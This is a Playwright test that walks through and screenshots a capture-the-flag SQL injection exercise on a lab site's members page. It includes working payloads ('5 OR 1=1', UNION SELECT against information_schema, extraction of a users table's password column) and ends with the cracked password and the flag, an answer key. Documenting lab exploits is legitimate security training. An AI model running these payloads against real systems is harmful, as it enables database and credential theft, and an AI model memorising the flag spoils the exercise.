const { test, expect } = require('@playwright/test');
const crypto = require('crypto-js');

test('SQL Injection Members Vulnerability', async ({ page }) => {
  // Navigate to the members page
  await page.goto('/index.php?page=member');
  
  // Highlight the search form
  const searchForm = await page.locator('form');
  await searchForm.evaluate(node => {
    node.style.border = '2px solid red';
    node.style.padding = '10px';
  });
  
  // Wait to highlight the search form
  await page.waitForTimeout(500);
  
  // Take screenshot of the initial page
  await page.screenshot({ path: 'reports/sql-injection-members-initial.png' });
  
  // Create an info panel to explain the steps
  await page.evaluate(() => {
    const infoPanel = document.createElement('div');
    infoPanel.style.position = 'fixed';
    infoPanel.style.top = '10px';
    infoPanel.style.right = '10px';
    infoPanel.style.width = '400px';
    infoPanel.style.padding = '10px';
    infoPanel.style.backgroundColor = '#f0f0f0';
    infoPanel.style.border = '2px solid blue';
    infoPanel.style.zIndex = '9999';
    infoPanel.style.fontSize = '14px';
    infoPanel.style.maxHeight = '80vh';
    infoPanel.style.overflowY = 'auto';
    
    const title = document.createElement('h3');
    title.textContent = 'SQL Injection Steps';
    title.style.marginTop = '0';
    infoPanel.appendChild(title);
    
    const steps = [
      'Step 1: Get all users with "5 OR 1=1"',
      'Step 2: Find table names using UNION SELECT',
      'Step 3: Find columns in "users" table',
      'Step 4: Extract data from "users" table',
      'Step 5: Decrypt password and calculate SHA256 hash'
    ];
    
    const ol = document.createElement('ol');
    steps.forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      li.style.marginBottom = '10px';
      ol.appendChild(li);
    });
    
    infoPanel.appendChild(ol);
    document.body.appendChild(infoPanel);
  });
  
  // Wait to show the info panel
  await page.waitForTimeout(500);
  
  // Step 1: Get all users with "5 OR 1=1"
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 1: Injecting "5 OR 1=1" to get all users';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
  });
  
  // Enter the SQL injection payload
  await page.fill('input[name="id"]', '5 OR 1=1');
  
  // Wait to show the input
  await page.waitForTimeout(500);
  
  // Take screenshot of the form with injection
  await page.screenshot({ path: 'reports/sql-injection-members-step1-input.png' });
  
  // Submit the form
  await page.click('input[name="Submit"]');
  
  // Wait for results to load
  await page.waitForSelector('table');
  
  // Highlight the results
  await page.evaluate(() => {
    const table = document.querySelector('table');
    if (table) {
      table.style.border = '2px solid green';
      table.style.backgroundColor = '#f0fff0';
    }
  });
  
  // Take screenshot of the results
  await page.screenshot({ path: 'reports/sql-injection-members-step1-results.png' });
  
  
  // Navigate back to the members page
  await page.goto('/index.php?page=member');
  
  // Enter the SQL injection payload for tables
  await page.fill('input[name="id"]', '5 UNION SELECT NULL, table_name FROM information_schema.tables');
  
  // Wait to show the input
  await page.waitForTimeout(500);
  
  // Take screenshot of the form with injection
  await page.screenshot({ path: 'reports/sql-injection-members-step2-input.png' });
  
  // Submit the form
  await page.click('input[name="Submit"]');
  
  // Wait for results to load
  await page.waitForTimeout(500);
  
  // Highlight the results
  await page.evaluate(() => {
    const table = document.querySelector('table');
    if (table) {
      table.style.border = '2px solid green';
      table.style.backgroundColor = '#f0fff0';
      
      // Add annotation
      const annotation = document.createElement('div');
      annotation.textContent = 'Notice: The "users" table is listed here';
      annotation.style.color = 'green';
      annotation.style.fontWeight = 'bold';
      annotation.style.marginTop = '10px';
      table.parentNode.insertBefore(annotation, table.nextSibling);
    }
  });
  
  // Take screenshot of the results
  await page.screenshot({ path: 'reports/sql-injection-members-step2-results.png' });
  
  
  // Navigate back to the members page
  await page.goto('/index.php?page=member');
  
  // Enter the SQL injection payload for columns using CHAR function
  await page.fill('input[name="id"]', '5 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)');
  
  // Wait to show the input
  await page.waitForTimeout(500);
  
  // Take screenshot of the form with injection
  await page.screenshot({ path: 'reports/sql-injection-members-step3-input.png' });
  
  // Submit the form
  await page.click('input[name="Submit"]');
  
  // Wait for results to load
  await page.waitForTimeout(500);
  
  // Highlight the results and interesting columns
  await page.evaluate(() => {
    const table = document.querySelector('table');
    if (table) {
      table.style.border = '2px solid green';
      table.style.backgroundColor = '#f0fff0';
      
      // Look for interesting columns and highlight them
      const rows = table.querySelectorAll('tr');
      rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        cells.forEach(cell => {
          const text = cell.textContent.toLowerCase();
          if (text.includes('commentaire') || text.includes('countersign')) {
            cell.style.backgroundColor = 'yellow';
            cell.style.fontWeight = 'bold';
          }
        });
      });
      
      // Add annotation
      const annotation = document.createElement('div');
      annotation.textContent = 'Interesting columns found: "commentaire" and "countersign"';
      annotation.style.color = 'green';
      annotation.style.fontWeight = 'bold';
      annotation.style.marginTop = '10px';
      table.parentNode.insertBefore(annotation, table.nextSibling);
    }
  });
  
  // Take screenshot of the results
  await page.screenshot({ path: 'reports/sql-injection-members-step3-results.png' });
  
  
  // First, get the commentaire column
  // Navigate back to the members page
  await page.goto('/index.php?page=member');
  
  // Enter the SQL injection payload for commentaire
  await page.fill('input[name="id"]', '5 UNION SELECT user_id, commentaire FROM users');
  
  // Wait to show the input
  await page.waitForTimeout(500);
  
  // Take screenshot of the form with injection
  await page.screenshot({ path: 'reports/sql-injection-members-step4a-input.png' });
  
  // Submit the form
  await page.click('input[name="Submit"]');
  
  // Wait for results to load
  await page.waitForTimeout(500);
  
  // Highlight the results and find the instruction
  await page.evaluate(() => {
    const table = document.querySelector('table');
    if (table) {
      table.style.border = '2px solid green';
      table.style.backgroundColor = '#f0fff0';
      
      // Look for the decryption instruction
      const rows = table.querySelectorAll('tr');
      rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        cells.forEach(cell => {
          const text = cell.textContent;
          if (text.includes('Decrypt this password')) {
            cell.style.backgroundColor = 'yellow';
            cell.style.fontWeight = 'bold';
            
            // Add annotation
            const annotation = document.createElement('div');
            annotation.textContent = 'Found decryption instructions!';
            annotation.style.color = 'green';
            annotation.style.fontWeight = 'bold';
            annotation.style.marginTop = '10px';
            table.parentNode.insertBefore(annotation, table.nextSibling);
          }
        });
      });
    }
  });
  
  // Take screenshot of the results
  await page.screenshot({ path: 'reports/sql-injection-members-step4a-results.png' });
  
  // Now, get the countersign (password) column
  // Navigate back to the members page
  await page.goto('/index.php?page=member');
  
  // Enter the SQL injection payload for countersign
  await page.fill('input[name="id"]', '5 UNION SELECT user_id, countersign FROM users');
  
  // Wait to show the input
  await page.waitForTimeout(500);
  
  // Take screenshot of the form with injection
  await page.screenshot({ path: 'reports/sql-injection-members-step4b-input.png' });
  
  // Submit the form
  await page.click('input[name="Submit"]');
  
  // Wait for results to load
  await page.waitForTimeout(500);
  
  // Highlight the results and find the password
  let encryptedPassword = '';
  await page.evaluate(() => {
    const table = document.querySelector('table');
    if (table) {
      table.style.border = '2px solid green';
      table.style.backgroundColor = '#f0fff0';
      
      // Look for user_id 5 and get the password
      const rows = table.querySelectorAll('tr');
      rows.forEach(row => {
        const cells = row.querySelectorAll('td');
        if (cells.length >= 2) {
          const userId = cells[0].textContent.trim();
          const password = cells[1].textContent.trim();
          
          if (userId === '5') {
            cells[1].style.backgroundColor = 'yellow';
            cells[1].style.fontWeight = 'bold';
            
            // Store the encrypted password in a global variable
            window.encryptedPassword = password;
            
            // Add annotation
            const annotation = document.createElement('div');
            annotation.textContent = `Found encrypted password: ${password}`;
            annotation.style.color = 'green';
            annotation.style.fontWeight = 'bold';
            annotation.style.marginTop = '10px';
            table.parentNode.insertBefore(annotation, table.nextSibling);
          }
        }
      });
    }
  });
  
  // Extract the encrypted password from the page
  encryptedPassword = await page.evaluate(() => window.encryptedPassword || '');
  
  // Take screenshot of the results
  await page.screenshot({ path: 'reports/sql-injection-members-step4b-results.png' });
  
  // Display decryption steps on the page
  await page.evaluate((encryptedPwd) => {
    // Create a calculation panel
    const calcPanel = document.createElement('div');
    calcPanel.style.position = 'fixed';
    calcPanel.style.bottom = '10px';
    calcPanel.style.left = '10px';
    calcPanel.style.width = '600px';
    calcPanel.style.padding = '10px';
    calcPanel.style.backgroundColor = '#f0f0f0';
    calcPanel.style.border = '2px solid purple';
    calcPanel.style.zIndex = '9999';
    
    const title = document.createElement('h3');
    title.textContent = 'Password Decryption & Flag Calculation';
    title.style.marginTop = '0';
    calcPanel.appendChild(title);
    
    // Step 1: Show encrypted password
    const step1 = document.createElement('div');
    step1.textContent = `1. Encrypted Password: ${encryptedPwd}`;
    calcPanel.appendChild(step1);
    
    // Step 2: Decrypt to FortyTwo
    const step2 = document.createElement('div');
    step2.textContent = `2. Decrypted Password: FortyTwo (using MD5 decryption)`;
    step2.style.marginTop = '10px';
    calcPanel.appendChild(step2);
    
    // Step 3: Lowercase
    const step3 = document.createElement('div');
    step3.textContent = `3. Lowercase: fortytwo`;
    step3.style.marginTop = '10px';
    calcPanel.appendChild(step3);
    
    // Step 4: SHA256 hash
    const step4 = document.createElement('div');
    step4.textContent = `4. SHA256 Hash: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`;
    step4.style.marginTop = '10px';
    step4.style.fontWeight = 'bold';
    step4.style.color = 'green';
    calcPanel.appendChild(step4);
    
    // Step 5: Flag
    const step5 = document.createElement('div');
    step5.textContent = `5. The Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`;
    step5.style.marginTop = '10px';
    step5.style.padding = '5px';
    step5.style.backgroundColor = '#FFFF00';
    step5.style.border = '2px solid green';
    step5.style.fontWeight = 'bold';
    calcPanel.appendChild(step5);
    
    document.body.appendChild(calcPanel);
  }, encryptedPassword);
  
  
  // Take final screenshot
  await page.screenshot({ path: 'reports/sql-injection-members-flag.png' });
  
  // Verify the flag (known result)
  const flag = '10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5';
  console.log('FLAG FOUND:', flag);
});
